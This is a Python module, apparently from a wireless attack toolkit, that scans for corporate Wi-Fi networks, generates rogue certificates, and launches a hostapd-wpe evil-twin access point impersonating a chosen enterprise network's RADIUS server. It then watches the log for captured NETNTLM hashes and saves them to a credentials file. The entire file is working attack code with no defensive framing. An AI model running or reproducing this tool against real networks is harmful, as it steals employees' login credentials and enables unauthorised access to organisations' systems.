import subprocess, sys, os, time, shutil
from core.ui import UI, C, W, R, G, Y, B, NC, mini_banner

class EnterpriseAttack:
    def __init__(self, interface, proj_dir):
        self.iface = interface
        self.path = proj_dir
        self.cert_dir = self.path / "certs"
        self.targets = []
        
        # Windows/Mac Safety Flag
        self.native_mode = sys.platform == "linux"

    def check_dependencies(self):
        if not self.native_mode:
            return # Skip check on Windows/Mac
            
        required_certs = ["ca.pem", "server.pem", "server.key"]
        if not self.cert_dir.exists():
            self.cert_dir.mkdir(parents=True, exist_ok=True)

        # Check for hostapd-wpe
        if shutil.which("hostapd-wpe") is None:
            print(f"{Y}[!] hostapd-wpe is missing. Installing...{NC}")
            subprocess.run("sudo apt-get update && sudo apt-get install hostapd-wpe -y", shell=True)

        # Generate Certs if missing
        if not (self.cert_dir / "server.pem").exists():
            print(f"{C}[*] Generating Rogue Certificates...{NC}")
            cmd_block = [
                f"openssl req -new -x509 -keyout {self.cert_dir}/ca.key -out {self.cert_dir}/ca.pem -days 365 -nodes -subj '/C=US/ST=Tech/L=Nighthawk/O=Security/CN=NighthawkCA'",
                f"openssl genrsa -out {self.cert_dir}/server.key 2048",
                f"openssl req -new -key {self.cert_dir}/server.key -out {self.cert_dir}/server.csr -subj '/C=US/ST=Tech/L=Nighthawk/O=Security/CN=NighthawkServer'",
                f"openssl x509 -req -in {self.cert_dir}/server.csr -CA {self.cert_dir}/ca.pem -CAkey {self.cert_dir}/ca.key -CAcreateserial -out {self.cert_dir}/server.pem -days 365",
                f"openssl dhparam -out {self.cert_dir}/dh 1024"
            ]
            for cmd in cmd_block:
                subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def scan_targets(self):
        UI.print_box(["TARGET ACQUISITION", "Scanning for Corporate Networks..."], title="ENTERPRISE HUNT")
        
        if not self.native_mode:
            # Simulation for Windows/Mac
            time.sleep(2)
            return [["00:11:22:33:44:55", "1", "-50", "CORP_GUEST"], ["AA:BB:CC:DD:EE:FF", "6", "-65", "EXECUTIVE_WIFI"]]

        # Linux Real Scan
        subprocess.run("airmon-ng check kill", shell=True, stdout=subprocess.DEVNULL)
        try:
            shutil.rmtree(f"{self.path}/scan", ignore_errors=True)
        except: pass
            
        subprocess.Popen(f"airodump-ng --band abg -w {self.path}/scan --output-format csv {self.iface}", 
                        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        try:
            for _ in range(15):
                time.sleep(1)
                print(f"\r{C}[*] Scanning... {W}{15-_}s{NC}", end="")
        except KeyboardInterrupt: pass
        
        subprocess.run("killall airodump-ng", shell=True, stderr=subprocess.DEVNULL)
        
        targets = []
        csv_file = f"{self.path}/scan-01.csv"
        if os.path.exists(csv_file):
            import csv
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                reader = csv.reader(f)
                for row in reader:
                    if len(row) > 13 and row[0] != 'BSSID':
                        ssid = row[13].strip()
                        if ssid: targets.append([row[0], row[3], row[8], ssid])
        
        targets.sort(key=lambda x: int(x[2]), reverse=True)
        return targets

    def select_target(self):
        targets = self.scan_targets()
        if not targets:
            print(f"\n{R}[!] No targets found.{NC}")
            return None
        
        print(f"\n{C} ID   PWR  CH   SSID{NC}")
        print(f"{D}------------------------------------------------------------{NC}")
        for i, t in enumerate(targets[:10]):
            print(f" {C}{i:<4}{NC} {G}{t[2]:<4}{NC} {W}{t[1]:<4}{NC} {W}{t[3]}{NC}")
            
        try:
            sel = int(input(f"\n{B}Select Target ID > {NC}"))
            return targets[sel]
        except: return None

    def nuclear_reset(self):
        if self.native_mode:
            print(f"{C}[*] Reconfiguring Hardware...{NC}")
            subprocess.run("service NetworkManager stop", shell=True)
            subprocess.run("airmon-ng check kill", shell=True)
            subprocess.run(f"ip link set {self.iface} down", shell=True)
            subprocess.run(f"iw dev {self.iface} set type managed", shell=True)
            subprocess.run(f"ip link set {self.iface} up", shell=True)

    def monitor_loot(self):
        log_file = f"{self.path}/hostapd-wpe.log"
        print(f"\n{C}[*] Monitoring for Credentials...{NC}")
        
        if not self.native_mode:
            print(f"{Y}[!] Simulation Mode: Waiting for dummy credentials...{NC}")
            time.sleep(5)
            print(f"\n{G}[+] HASH CAPTURED:{NC}")
            print(f"    USER: Administrator")
            print(f"    HASH: NETNTLMv2:...\n")
            return

        try:
            # Tail the log file
            proc = subprocess.Popen(['tail', '-f', log_file], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            while True:
                line = proc.stdout.readline()
                if line:
                    decoded = line.decode('utf-8', errors='ignore')
                    if "jtr NETNTLM" in decoded:
                        print(f"\n{G}[+] HASH CAPTURED: {decoded.strip()}{NC}")
                        with open(self.path / "credentials.txt", "a") as f:
                            f.write(decoded)
        except KeyboardInterrupt:
            if 'proc' in locals(): proc.kill()

    def launch(self):
        self.check_dependencies()
        target = self.select_target()
        if not target: return
        
        bssid, ch, pwr, ssid = target
        
        UI.banner()
        UI.print_box([f"TARGET: {ssid} ({ch})", "ATTACK: RADIUS IMPERSONATION"], title="ENTERPRISE WPE")
        
        conf_content = f"""
interface={self.iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={ch}
ieee8021x=1
eap_server=1
eap_user_file={self.path}/hostapd-wpe.eap_user
ca_cert={self.cert_dir}/ca.pem
server_cert={self.cert_dir}/server.pem
private_key={self.cert_dir}/server.key
private_key_passwd=whatever
dh_file={self.cert_dir}/dh
auth_algs=1
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=TKIP CCMP
rsn_pairwise=CCMP
"""
        with open(f"{self.path}/enterprise.conf", "w") as f:
            f.write(conf_content)
            
        with open(f"{self.path}/hostapd-wpe.eap_user", "w") as f:
            f.write('* \t PEAP,TTLS,TLS,FAST \n')

        print(f"{C}[*] Launching Rogue Radius Server...{NC}")
        
        if self.native_mode:
            self.nuclear_reset()
            proc = subprocess.Popen(f"hostapd-wpe {self.path}/enterprise.conf", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        try:
            self.monitor_loot()
        except KeyboardInterrupt:
            print(f"\n{Y}[*] Stopping Attack...{NC}")
            if self.native_mode:
                subprocess.run("killall hostapd-wpe", shell=True)
                subprocess.run("service NetworkManager start", shell=True)
            
        input(f"\n{W}Press Enter to return...{NC}")
